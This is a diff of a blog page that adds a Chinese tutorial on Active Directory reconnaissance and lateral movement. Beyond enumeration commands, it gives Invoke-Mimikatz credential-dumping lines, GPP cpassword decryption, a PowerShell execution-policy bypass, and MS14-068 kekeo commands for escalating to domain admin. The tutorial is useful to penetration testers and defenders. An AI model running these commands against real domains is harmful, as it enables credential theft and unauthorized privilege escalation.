@@ -323,6 +323,220 @@
 <!-- Table of Contents -->
 
   
+    <article id="post-域内信息收集"  class="article article-type-post" itemscope itemprop="blogPost" >
+  <div id="articleInner" class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="thumb" itemprop="name">
+      <a class="article-title" href="/2018/04/11/域内信息收集/">域内信息收集</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-meta">
+      
+	<a href="/2018/04/11/域内信息收集/" class="article-date">
+	  <time datetime="2018-04-11T13:03:56.000Z" itemprop="datePublished">2018-04-11</time>
+	</a>
+
+      
+      
+    </div>
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="域内信息收集"><a href="#域内信息收集" class="headerlink" title="域内信息收集"></a>域内信息收集</h1><blockquote>
+<p>​    记录下域内信息收集的技巧总结</p>
+</blockquote>
+<h3 id="SRV记录（标明主机服务信息）"><a href="#SRV记录（标明主机服务信息）" class="headerlink" title="SRV记录（标明主机服务信息）"></a>SRV记录（标明主机服务信息）</h3><p>SRV是DNS中的一种资源记录。SRV记录用于<strong>将服务的名称映射到提供该服务的服务器的DNS计算机</strong>名称。</p>
+<p>简单来说，它<strong>标明了哪台主机提供哪种服务的信息</strong>。</p>
+<p>Windows域中的服务会注册下列格式的srv记录：</p>
+<p>​     _Service._Protocol.DnsDomainName</p>
+<p>在windows域中，活动目录的正常工作依赖于DNS。</p>
+<p>活动目录服务器通过tcp协议提供LDAP服务，因此它注册的srv记录类似于：</p>
+<p>​     _ldap._tcp.example.com</p>
+<p>域控制器则会以下面的形式注册srv记录：</p>
+<p>​    _Service._Protocol.DCType._msdcs.DomainName, 这里的DCType可以是dc(域控制器),gc(全局编录),pdc(主域控制器)等。</p>
+<p>例如：_ldap._tcp.dc._msdcs.example.com</p>
+<h4 id="nslookup"><a href="#nslookup" class="headerlink" title="nslookup"></a>nslookup</h4><p>nslookup是一种网络管理工具，用于查询域名系统（DNS）以获取域名或IP地址映射或任何其他特定的DNS记录。</p>
+<p>域控制器会注册一个srv记录，因此可以通过使用nslookup来查询这个srv记录，定位域控制器。</p>
+<p>交互式命令：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">nslookup                             # 进入交互式界面</span><br><span class="line"></span><br><span class="line">set type=all                     # 设置记录类型，可以设置为srv</span><br><span class="line"></span><br><span class="line">ldap.tcp.dc._msdcs.exist.local    # 执行查询</span><br></pre></td></tr></table></figure>
+<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/181027/889FJF18ie.png?imageslim" alt="mark"></p>
+<p>nslookup输出</p>
+<p>nslookup</p>
+<p>输出：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">服务器:  UnKnown</span><br><span class="line"></span><br><span class="line">Address:  172.17.0.128</span><br><span class="line"></span><br><span class="line">ldap.tcp.dc._msdcs.exist.com  SRV service location:</span><br><span class="line"></span><br><span class="line">          priority       = 0</span><br><span class="line"></span><br><span class="line">          weight       = 100</span><br><span class="line"></span><br><span class="line">          port           = 389</span><br><span class="line"></span><br><span class="line">          svr hostname   = win-dc.example.com</span><br><span class="line"></span><br><span class="line">win-dc.example.com       internet address = 172.17.0.128               # 这里就是域控的地址</span><br></pre></td></tr></table></figure>
+<h3 id="SPN-服务主体名称"><a href="#SPN-服务主体名称" class="headerlink" title="SPN(服务主体名称)"></a>SPN(服务主体名称)</h3><p>SPN全名服务主体名称，作用是对服务进行<strong>唯一的标识</strong>。</p>
+<p>在windows域中，服务实例需要注册一个spn，这样才能使用kerberos身份验证。SPN的注册格式为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ServiceName/FQDN:&lt;port | servicename&gt;</span><br></pre></td></tr></table></figure>
+<p>FQDN是指完全限定域名。它可以标识出主机的逻辑位置。FQDN的格式为：主机名.域名，例如，一台搭载webserver的服务器主机名为webserver，域名为example.com，则FQDN为<strong>webserver.example.com</strong></p>
+<p>SPN扫描</p>
+<p>​    在windows域环境中，spn扫描是发现服务最好的一种方式，因为spn扫描的原理是使用ldap来向域控查询，因此不需要扫描内网中的每一台主机，流量不仅较小而且也很正常（kerberos认证依赖spn）。</p>
+<p>下列是一些spn服务名的示例：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">TERMSERV   -  RDP</span><br><span class="line"></span><br><span class="line">HOST  -  主机</span><br><span class="line"></span><br><span class="line">VNC    -   VNC服务器</span><br><span class="line"></span><br><span class="line">MSSQL  -  sql  server</span><br></pre></td></tr></table></figure>
+<p>更多的spn服务名称，可以参考：<a href="https://adsecurity.org/?page_id=183" target="_blank" rel="noopener">https://adsecurity.org/?page_id=183</a></p>
+<h4 id="Setspn使用"><a href="#Setspn使用" class="headerlink" title="Setspn使用"></a>Setspn使用</h4><p>Setspn.exe</p>
+<p>Setspn是一款管理spn的命令行软件。我们可以用它来查看某台主机或账户的spn</p>
+<p>示例：</p>
+<p>查看netbios名称为DM1主机的spn</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Setspn –L  DM1</span><br></pre></td></tr></table></figure>
+<p>查看账户example的spn</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Setspn –L example</span><br></pre></td></tr></table></figure>
+<p>查看当前域中的所有spn</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Setspn –T ＊  -Q  /</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\shackle&gt;Setspn</span><br><span class="line">缺少参数: accountname。</span><br><span class="line"></span><br><span class="line">用法: Setspn [modifiers switch] [accountname]</span><br><span class="line">  其中 "accountname" 可以是目标计算机或</span><br><span class="line">  用户帐户的名称或域\名称</span><br><span class="line"></span><br><span class="line">  编辑模式开关:</span><br><span class="line">   -R = 重置 HOST ServicePrincipalName</span><br><span class="line">    用法:   setspn -R accountname</span><br><span class="line">   -S = 验证不存在重复项之后，添加任意 SPN</span><br><span class="line">    用法:   setspn -S SPN accountname</span><br><span class="line">   -D = 删除任意 SPN</span><br><span class="line">    用法:   setspn -D SPN accountname</span><br><span class="line">   -L = 列出在目标帐户中注册的 SPN</span><br><span class="line">    用法:   setspn [-L] accountname</span><br><span class="line"></span><br><span class="line">  编辑模式修饰符:</span><br><span class="line">   -C = 指定 accountname 是计算机帐户</span><br><span class="line">   -U = 指定 accountname 是用户帐户</span><br><span class="line"></span><br><span class="line">    注意: -C 和 -U 具有排他性。如果两者均未指定，</span><br><span class="line">     则工具在存在此类计算机时将 accountname 解释为计算机名，</span><br><span class="line">     不存在时解释为用户名。</span><br><span class="line"></span><br><span class="line">  查询模式开关:</span><br><span class="line">   -Q = 查询 SPN 是否存在</span><br><span class="line">    用法:   setspn -Q SPN</span><br><span class="line">   -X = 搜索重复的 SPN</span><br><span class="line">    用法:   setspn -X</span><br><span class="line"></span><br><span class="line">    注意: 搜索重复项(尤其在林范围内)可能需要</span><br><span class="line">     较长的时间，并占用大量内存。 -Q 将在</span><br><span class="line">     每个目标域/林上执行。-X 将返回存在于所有目标中的</span><br><span class="line">     重复项。不要求 SPN 在各个林之间是唯一的，</span><br><span class="line">     但重复项可能会导致在跨林进行身份验证时</span><br><span class="line">     出现身份验证问题。</span><br><span class="line"></span><br><span class="line">  查询模式修饰符:</span><br><span class="line">   -P = 抑制控制台的进度，可在将输出重定向到</span><br><span class="line">    文件时或在无人参与脚本中使用时使用。</span><br><span class="line">    直到命令完成后，才会输出内容。</span><br><span class="line">   -F = 在林级别而不是域级别执行查询</span><br><span class="line">   -T = 在指定的域或林(同时使用 -F 时)上执行查询</span><br><span class="line">    用法:   setspn -T domain (开关和其他参数)</span><br><span class="line">     可以使用 "" 或 * 表示当前域或林。</span><br><span class="line"></span><br><span class="line">    注意: 可以将这些修饰符与 -S 开关一起使用，</span><br><span class="line">     以便在添加 SPN 之前指定应在何处执行重复检查。</span><br><span class="line">    注意: 可以多次指定 -T。</span><br><span class="line"></span><br><span class="line">示例:</span><br><span class="line">setspn -R daserver1</span><br><span class="line">   它将注册 SPN "HOST/daserver1" 和 "HOST/&#123;DNS of daserver1&#125;"</span><br><span class="line">setspn -S http/daserver daserver1</span><br><span class="line">   如果域中不存在 SPN "http/daserver"，</span><br><span class="line">    它将为计算机 "daserver1" 注册此类 SPN</span><br><span class="line">setspn -D http/daserver daserver1</span><br><span class="line">   它将删除计算机 "daserver1" 的 SPN "http/daserver"</span><br><span class="line">setspn -F -S http/daserver daserver1</span><br><span class="line">   如果林中不存在 SPN "http/daserver"，</span><br><span class="line">    它将为计算机 "daserver1" 注册此类 SPN</span><br><span class="line">setspn -U -S http/daserver dauser</span><br><span class="line">   如果域中不存在 SPN "http/daserver"，</span><br><span class="line">     它将为用户帐户 "dauser" 注册此类 SPN</span><br><span class="line">setspn -T * -T bar -X</span><br><span class="line">   它将报告此域和 bar 中的所有重复 SPN 注册</span><br><span class="line">setspn -T bar -F -Q */daserver</span><br><span class="line">   它将查找在 bar 所属的林中以 */daserver 形式</span><br><span class="line">    注册的所有 SPN</span><br></pre></td></tr></table></figure>
+<h3 id="Netview使用（收集域内主机共享、ip、是否为域控等信息）"><a href="#Netview使用（收集域内主机共享、ip、是否为域控等信息）" class="headerlink" title="Netview使用（收集域内主机共享、ip、是否为域控等信息）"></a>Netview使用（收集域内主机共享、ip、是否为域控等信息）</h3><p>Netview.exe</p>
+<p>Netview 能够收集域内主机共享、ip、是否为域控等信息。</p>
+<p>Github项目地址：<a href="https://github.com/mubix/netview" target="_blank" rel="noopener">https://github.com/mubix/netview</a></p>
+<p>​    将主机名（或ip地址）列表保存在文件host.txt中，使用netview –f  host.txt来信息收集</p>
+<p>Netsess.exe    </p>
+<p>工具能够列举目标主机上的NetBIOS session，通常不依赖于管理员权限（-full参数列出所有会话需要管理权限）。</p>
+<p>下载地址：<a href="http://www.joeware.net/freetools/tools/netsess/index.htm" target="_blank" rel="noopener">http://www.joeware.net/freetools/tools/netsess/index.htm</a></p>
+<p>示例：</p>
+<p>​    如果有一台域成员（192.168.1.128）机器net view了本机的共享（192.168.1.130），那么它与本机之间会存在一个netbios会话，可以使用下列命令来查看会话用户：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsess  -h  192.168.1.130  -c \192.168.1.128</span><br></pre></td></tr></table></figure>
+<p>这里的-h参数指定了服务器的地址，-c参数则指定了客户端的地址 </p>
+<h3 id="Nltest（测试域间的信任关系）"><a href="#Nltest（测试域间的信任关系）" class="headerlink" title="Nltest（测试域间的信任关系）"></a>Nltest（测试域间的信任关系）</h3><p>Nltest.exe</p>
+<p><strong>Nltest可以用来测试域间的信任关系。</strong></p>
+<p>示例：</p>
+<p>Nltest /domain_trusts</p>
+<p>输出如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">List of domain trusts:</span><br><span class="line"></span><br><span class="line">    0: TURING turing.com (NT 5) (Forest Tree Root) (Direct Outbound) (Direct Inbound) ( Attr: 0x20 )</span><br><span class="line"></span><br><span class="line">    1: SUBDOMAIN subdomain.turing.com (NT 5) (Forest: 0) (Primary Domain) (Native)</span><br></pre></td></tr></table></figure>
+<p>Nltest.exe</p>
+<p>以域A做参照域（Primary Domain），另一个域为域B。</p>
+<p>①Direct Inbound（内传）</p>
+<p>域B为信任域，域A为可信域。信任方向B -》A</p>
+<p>②Direct Outbound（外传）</p>
+<p>域A为信任域，域B为可信域。信任方向A -》 B</p>
+<h3 id="ADFind（活动目录查询工具）"><a href="#ADFind（活动目录查询工具）" class="headerlink" title="ADFind（活动目录查询工具）"></a>ADFind（活动目录查询工具）</h3><p>Adfind是一款活动目录查询工具。</p>
+<p>下载地址：<a href="http://www.joeware.net/freetools/tools/adfind/" target="_blank" rel="noopener">http://www.joeware.net/freetools/tools/adfind/</a></p>
+<p>用户手册：<a href="http://www.joeware.net/freetools/tools/adfind/usage.htm" target="_blank" rel="noopener">http://www.joeware.net/freetools/tools/adfind/usage.htm</a></p>
+<p>示例：</p>
+<p>查询域中活动的主机,输出主机名和域名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Adfind –sc computers_active name dnshostname</span><br></pre></td></tr></table></figure>
+<p>列出域控列表</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Adfind –sc dclist</span><br></pre></td></tr></table></figure>
+<p>根据email查询域用户</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Adfind –sc email:exist@example.com</span><br></pre></td></tr></table></figure>
+<p>ADFind示例</p>
+<p>示例：</p>
+<p>查询域中主机的spn</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Adfind -b cn=computers,dc=example,dc=com servicePrincipalName</span><br></pre></td></tr></table></figure>
+<p>查询域管理员账户</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Adfind -b cn=&quot;Domain admins&quot;,cn=users,dc=example,dc=com member</span><br></pre></td></tr></table></figure>
+<p>获取dns记录</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -b DC=exist.com,CN=MicrosoftDNS,DC=DomainDnsZones,DC=example,DC=com dn</span><br></pre></td></tr></table></figure>
+<h3 id="PVEFindADUser-定位用户登录位置"><a href="#PVEFindADUser-定位用户登录位置" class="headerlink" title="PVEFindADUser(定位用户登录位置)"></a>PVEFindADUser(定位用户登录位置)</h3><p>PVEFindADUser.exe</p>
+<p>用来定位用户登录的位置，依赖管理员权限，输出会保存在一个csv文件中。</p>
+<p>Github地址：<a href="https://github.com/chrisdee/Tools/blob/master/AD/ADFindUsersLoggedOn/PVEFindADUser.exe" target="_blank" rel="noopener">https://github.com/chrisdee/Tools/blob/master/AD/ADFindUsersLoggedOn/PVEFindADUser.exe</a></p>
+<p>示例：</p>
+<p>显示每台计算机上登录的用户</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PVEFindaduser –current  -noping</span><br></pre></td></tr></table></figure>
+<p>查看172.17.0.132主机上登录的用户</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PVEFindADuser  -current  -target 172.17.0.132</span><br></pre></td></tr></table></figure>
+<p>查看每台计算机上次登录的用户</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PVEFindADuser  -last</span><br></pre></td></tr></table></figure>
+<h3 id="PowerSploit"><a href="#PowerSploit" class="headerlink" title="PowerSploit"></a>PowerSploit</h3><p>PowerSploit是一款powershell后渗透框架</p>
+<p>项目地址：<a href="https://github.com/PowerShellMafia/PowerSploit" target="_blank" rel="noopener">https://github.com/PowerShellMafia/PowerSploit</a></p>
+<p>框架一共分为下面几大块：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">CodeExecution  - 代码执行，用来执行代码、dll注入、shellcode注入等</span><br><span class="line"></span><br><span class="line">AntivirusBypass  - 用来检测杀软特征码</span><br><span class="line"></span><br><span class="line">Exfiltration  -  主要用来窃取敏感数据，比如sam数据库，窃取用户密码、记录键盘等</span><br><span class="line"></span><br><span class="line">Mayhem  -  可以使目标蓝屏等</span><br><span class="line"></span><br><span class="line">Persistence  -  用于持久控制</span><br><span class="line"></span><br><span class="line">Privesc  - 用于帮助提权</span><br><span class="line"></span><br><span class="line">Recon   -  信息收集模块</span><br><span class="line"></span><br><span class="line">ScriptModification    -  脚本加密、混淆等</span><br></pre></td></tr></table></figure>
+<p>PowerSploit中的脚本可以单独拿出来使用。</p>
+<p>通常的使用方法是：</p>
+<p>1.首先Powershell –ep bypass</p>
+<p>2.然后Import-Module 脚本名</p>
+<p>3.最后调用脚本中的函数名，比如import了invoke-shellcode.ps1,则执行可以输入invoke-shellcode arg1  arg2</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">示例：</span><br><span class="line"></span><br><span class="line">Invoke-Mimikatz是Mimikatz的powershell版。有些功能需要bypass uac。</span><br><span class="line"></span><br><span class="line">获取内存中的凭证：</span><br><span class="line"></span><br><span class="line">     invoke-mimikatz –dumpcreds</span><br><span class="line"></span><br><span class="line">执行mimikatz命令</span><br><span class="line"></span><br><span class="line">     invoke-mimikatz  -command “token::whoami exit”</span><br></pre></td></tr></table></figure>
+<h3 id="PowerView工具"><a href="#PowerView工具" class="headerlink" title="PowerView工具"></a>PowerView工具</h3><p>PowerView</p>
+<p>Powerview是一款域渗透工具。它包含了部分adfind拥有的功能，同时增加了一些新的功能。</p>
+<p>工具使用powershell开发，配合cobalt strike等工具使用十分方便。</p>
+<p>下载地址：<a href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1" target="_blank" rel="noopener">https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1</a></p>
+<p>项目的README在<a href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon" target="_blank" rel="noopener">https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon</a>， 里面有Powerview中的函数说明。</p>
+<p>参考文章：</p>
+<p><a href="https://www.harmj0y.net/blog/powershell/the-powerview-powerusage-series-1/" target="_blank" rel="noopener">https://www.harmj0y.net/blog/powershell/the-powerview-powerusage-series-1/</a></p>
+<p>遇到不知道如何使用的函数时，记得使用get-help</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1.Get-NetDomain  -  获取域信息</span><br><span class="line"></span><br><span class="line">2.Get-NetForest    -  获取林信息</span><br><span class="line"></span><br><span class="line">3.Get-NetDomainController  -  获取域控制器信息</span><br><span class="line"></span><br><span class="line">4.Get-Proxy – 获取代理信息</span><br><span class="line"></span><br><span class="line">5.Invoke-ProcessHunter   -  获取进程信息，可以指定用户名搜索，也可以指定进程名搜索</span><br><span class="line"></span><br><span class="line">6.Get-NetShare  -  获取共享信息</span><br></pre></td></tr></table></figure>
+<h3 id="CSVDE-amp-LDIFDE工具"><a href="#CSVDE-amp-LDIFDE工具" class="headerlink" title="CSVDE&amp;LDIFDE工具"></a>CSVDE&amp;LDIFDE工具</h3><p>Csvde和ldifde的功能基本相同，都是从ad ds中导入/导出数据，区别在于前者处理csv格式的数据，后者处理ldif格式的数据。Csvde参数与ldifde参数基本相同，这里仅举csvde的几个例子：</p>
+<p>在安装了ad ds/lds服务的计算机上才会启用此工具，工具位于%windir%\system32\csvde.exe</p>
+<p>从活动目录中导出用户信息：</p>
+<p>   csvde  -d “cn=users,dc=example,dc=com” –r “objectclass=user” –f output.csv</p>
+<p>从活动目录中导出域控信息：</p>
+<p>   csvde  -d “ou=domain\20controllers,dc=example,dc=com”  -r “objectclass=computer” –f output.csv</p>
+<p>-d 参数用来设置rootdn，说简单点就是目录树搜索开始的地方， -r参数指定过滤器</p>
+<h3 id="ADExplorer-exe工具"><a href="#ADExplorer-exe工具" class="headerlink" title="ADExplorer.exe工具"></a>ADExplorer.exe工具</h3><p>ADExplorer.exe</p>
+<p>一款查看域结构的工具。</p>
+<p>下载地址：<a href="https://download.sysinternals.com/files/AdExplorer.zip" target="_blank" rel="noopener">https://download.sysinternals.com/files/AdExplorer.zip</a></p>
+<h3 id="LDAPSearch工具"><a href="#LDAPSearch工具" class="headerlink" title="LDAPSearch工具"></a>LDAPSearch工具</h3><p>LDAPSearch</p>
+<p>Ldapsearch是linux下的ldap客户端。</p>
+<p>示例：</p>
+<p>​        ldapsearch -x -h 172.17.0.128 -b “cn=computers,dc=example,dc=com” -D “<a href="mailto:exist@example.com" target="_blank" rel="noopener">exist@example.com</a>“ –w “123456” “(!(dnshostname=DOMAIN1DM1.example.com))“</p>
+<p>参数解释：</p>
+<p>​       -x  进行认证</p>
+<p>​       -h  设置主机</p>
+<p>​       -b  设置basedn</p>
+<p>​       -D  设置用户名</p>
+<p>​       -w  设置密码</p>
+<p>​       “(!(dnshostname=DOMAIN1DM1.example.com))“    对结果进行过滤，使用ldap语法</p>
+<h2 id="横向拓展常见漏洞利用"><a href="#横向拓展常见漏洞利用" class="headerlink" title="横向拓展常见漏洞利用"></a>横向拓展常见漏洞利用</h2><h3 id="GPP漏洞"><a href="#GPP漏洞" class="headerlink" title="GPP漏洞"></a>GPP漏洞</h3><p>组策略</p>
+<blockquote>
+<p>组策略是windows操作系统中的一种基础架构，用来帮助管理员对用户及计算机实施特定的配置。</p>
+</blockquote>
+<p>组策略分为两种类型：本地组策略和域组策略。本地组策略适用于未加入域和已加入域但未登录到域的计算机。域组策略存储在域控制器上，只能在活动目录环境中使用。</p>
+<ul>
+<li>组策略对象</li>
+</ul>
+<p>组策略对象（GPO）是一组组策略设置的集合。</p>
+<ul>
+<li>组策略首选项</li>
+</ul>
+<p>组策略首选项（Group Policy Preference, GPP）借助组策略对象（Group Policy Object, GPO）实现了对域中所有资源的管理。</p>
+<p>组策略对象包含两部分：组策略容器（GPC）和组策略模板（GPT）。组策略容器存储在ad数据库中，主要记录gpo的版本和属性等信息，而组策略模板则是一个文件夹，位置默认在%systemroot%\sysvol\sysvol\domainname\Policies{GUID}   </p>
+<p>SYSVOL文件夹</p>
+<p>默认位置在%systemroot%\sysvol，用来存储组策略配置及脚本等文件，其子文件夹sysvol对应于DC上的SYSVOL共享，域成员均有权限读取此共享。</p>
+<p>GPP漏洞</p>
+<p>1.管理员常用组策略首选项功能： 为所有域成员主机添加本地用户。</p>
+<p>2.添加此组策略首选项后，当域成员更新组策略时，会从域控的sysvol共享中下载一个groups.xml文件，里面有新建用户的信息，其中包含了加密的密码</p>
+<p>3.Xml文件内容示例：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">Groups</span> <span class="attr">clsid</span>=<span class="string">"&#123;3125E937-EB16-4b4c-9934-544FC6D24D26&#125;"</span>&gt;</span><span class="tag">&lt;<span class="name">User</span> <span class="attr">clsid</span>=<span class="string">"&#123;DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1&#125;"</span> <span class="attr">name</span>=<span class="string">"example"</span> <span class="attr">image</span>=<span class="string">"2"</span> <span class="attr">changed</span>=<span class="string">"2018-03-05 13:40:42"</span> <span class="attr">uid</span>=<span class="string">"&#123;0C50F05E-D3D5-4C91-B5FE-8991CD22231D&#125;"</span> <span class="attr">userContext</span>=<span class="string">"0"</span> <span class="attr">removePolicy</span>=<span class="string">"0"</span>&gt;</span><span class="tag">&lt;<span class="name">Properties</span> <span class="attr">action</span>=<span class="string">"U"</span> <span class="attr">newName</span>=<span class="string">""</span> <span class="attr">fullName</span>=<span class="string">"example"</span> <span class="attr">description</span>=<span class="string">""</span> <span class="attr">cpassword</span>=<span class="string">"SZ/RdrwxoUkV5Gv+C5cYmdW7XWbSfA6WFaY+7xTlIU8"</span> <span class="attr">changeLogon</span>=<span class="string">"0"</span> <span class="attr">noChange</span>=<span class="string">"0"</span> <span class="attr">neverExpires</span>=<span class="string">"1"</span> <span class="attr">acctDisabled</span>=<span class="string">"0"</span> <span class="attr">subAuthority</span>=<span class="string">""</span> <span class="attr">userName</span>=<span class="string">"example"</span>/&gt;</span><span class="tag">&lt;/<span class="name">User</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">Groups</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>微软公开了它的对称AES密钥，因此我们可以对其进行解密。</p>
+<ul>
+<li>介绍一款漏洞利用的工具：Get-GPPPassword</li>
+</ul>
+<p>这个powershell脚本包含在powersploit框架中。使用时需要import-module后调用get-gpppassword这个cmdlet。</p>
+<p>如果出现下列错误：</p>
+<p>Get-DecryptedCpassword : 找不到类型 [System.Security.Cryptography.AesCryptoServiceProvider]: 请确保已加载包含此类型的程序集。</p>
+<p>可以在运行前执行下列命令：Add-Type -AssemblyName System.Core</p>
+<h3 id="MS14-068漏洞"><a href="#MS14-068漏洞" class="headerlink" title="MS14-068漏洞"></a>MS14-068漏洞</h3><p>MS14-068</p>
+<p>Ms14-068漏洞可以使任意一个普通域用户提升至</p>
+<p>域管理员权限。</p>
+<p>利用工具：</p>
+<p>Kekeo 项目地址：</p>
+<p><a href="https://github.com/gentilkiwi/kekeo" target="_blank" rel="noopener">https://github.com/gentilkiwi/kekeo</a></p>
+<p>示例：</p>
+<p>在拿到一个域用户的密码后，使用下列命令生成票据：</p>
+<p>Exploit::ms14068  /domain:example.com  /user:example  /password:Welcometoexample</p>
+<p>这会在kekeo目录下生成一张票据。之后使用kerberos::purge来清除内存中已有的票据，等待数秒后，使用</p>
+<p>Kerberos::ptt  票据文件名 来导入票据。如果上述操作没有问题的话，现在已经拥有域管理员权限，可以使用dir \域控主机名\c$来测试一下权限，能列出目录则说明已是域管理员权限。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/内网渗透/">内网渗透</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+<!-- Table of Contents -->
+
+  
     <article id="post-BSides Vancouver"  class="article article-type-post" itemscope itemprop="blogPost" >
   <div id="articleInner" class="article-inner">
     
@@ -1751,115 +1965,11 @@
 <!-- Table of Contents -->
 
   
-    <article id="post-Office远程代码执行漏洞（CVE-2017-11882）"  class="article article-type-post" itemscope itemprop="blogPost" >
-  <div id="articleInner" class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 class="thumb" itemprop="name">
